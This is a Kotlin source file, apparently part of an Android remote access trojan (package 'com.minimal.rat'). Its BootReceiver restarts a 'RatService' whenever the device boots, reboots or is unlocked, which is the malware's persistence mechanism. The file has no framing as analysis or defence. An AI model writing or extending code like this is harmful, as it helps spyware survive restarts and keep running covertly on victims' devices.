package com.minimal.rat.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.minimal.rat.service.RatService
import com.minimal.rat.util.DeviceUtils
import com.minimal.rat.util.PreferencesManager

class BootReceiver : BroadcastReceiver() {
    companion object { private const val TAG = "BootReceiver" }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.d(TAG, "Boot action: $action")
        when (action) {
            Intent.ACTION_BOOT_COMPLETED, Intent.ACTION_REBOOT, Intent.ACTION_USER_PRESENT -> {
                PreferencesManager.init(context)
                DeviceUtils.init(context)
                val i = Intent(context, RatService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(i) else context.startService(i)
            }
        }
    }
}